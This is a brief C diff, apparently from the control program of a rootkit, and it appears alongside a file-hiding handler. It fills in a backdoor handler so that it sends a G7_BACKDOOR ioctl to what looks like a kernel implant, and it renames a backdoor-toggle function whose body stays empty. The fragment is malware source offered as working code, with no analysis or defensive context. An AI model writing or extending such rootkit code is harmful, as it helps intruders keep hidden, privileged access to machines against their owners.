@@ -79,12 +79,13 @@ handle_filehide(void *arg)
 }
 
 int
-handle_backdoor_execve(void *arg)
+handle_backdoor(void *arg)
 {
+    return issue_ioctl(G7_BACKDOOR, (const char *)arg);
 }
 
 int
-handle_backdoor_toggle(void *arg)
+handle_togglebd(void *arg)
 {
 }
 
